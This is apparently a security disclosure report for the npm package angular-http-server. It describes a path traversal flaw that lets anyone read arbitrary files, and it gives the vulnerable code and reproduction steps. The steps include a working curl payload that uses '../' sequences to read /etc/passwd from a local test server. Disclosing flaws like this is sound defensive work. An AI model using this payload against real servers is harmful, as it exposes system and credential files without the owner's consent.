Summary:

Hi Guys,

**angular-http-server** (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

**Module:** 

A very simple application server designed for Single Page App (SPA) developers.
(https://www.npmjs.com/package/angular-http-server)


**Description**

angular-http-server does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.

Vulnerable code in ```angular-http-server.js``` file (lines 66-82):

```javascript
fs.stat(possibleFilename, function(err, stats) {
        var fileBuffer;
        if (!err && stats.isFile()) {
            fileBuffer = fs.readFileSync(possibleFilename);
            let ct = mime.lookup(possibleFilename);
            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);
            res.writeHead(200, { 'Content-Type': ct });

        } else {
            console.log("Route %s, replacing with index.html", possibleFilename);
            fileBuffer = returnDistFile();
            res.writeHead(200, { 'Content-Type': 'text/html' });
        }

        res.write(fileBuffer);
        res.end();
    });
```

File with ```possibleFilename``` name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.


## Steps To Reproduce:

- install ```angular-http-server```

```
$ npm install angular-http-server
```

- create static ```index.html``` file (required as starting point of an app:

```html
<html>

<head>
    <meta charset="utf8">
    <title>Index HTML</title>
</head>

<body>
    <div>
        <p>This is index.html :)</p>
    </div>
</body>

</html>
```

- run server in the same folder where ```index.html``` was created:

```
$ angular-http-server --path ./
```

- open the browser and go to ```127.0.0.1:8080``` You should see HTML output.

- from the terminal, execute folloiwng command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
```

You should see the content of ```/etc/passwd``` file:

{F257351}

Also, in the ```angular-http-server``` log there is information about mime type of the file (```application/octet-stream```):

```
$ ./node_modules/angular-http-server/angular-http-server.js --path ./
Path specified: ./
Using index.html
Listening on 8080
Sending ../../../../../etc/passwd with Content-Type application/octet-stream

```



## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

## Impact

This vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.

This might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.
